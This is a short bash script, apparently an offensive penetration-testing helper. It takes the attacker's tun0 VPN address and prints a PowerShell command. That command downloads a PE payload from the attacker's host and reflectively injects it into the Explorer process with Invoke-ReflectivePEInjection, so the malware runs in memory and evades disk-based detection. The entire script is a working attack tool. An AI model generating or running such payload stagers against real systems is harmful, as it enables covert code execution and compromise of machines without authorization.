#!/bin/bash

if [ "$#" -ne 1 ]; then
    printf '%s <downloadfile>\n' "$0" 1>&2
    exit 1
fi

ip="$(ip a s tun0 | grep -oP '(\d{1,3}\.){3}\d{1,3}')"
printf '$bytes = (New-Object Net.WebClient).DownloadData('"'"'http://%s/%s'"'"')\n' "$ip" "$1"
printf '$procId = (Get-Process -Name Explorer).Id\n'
printf 'Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procId'
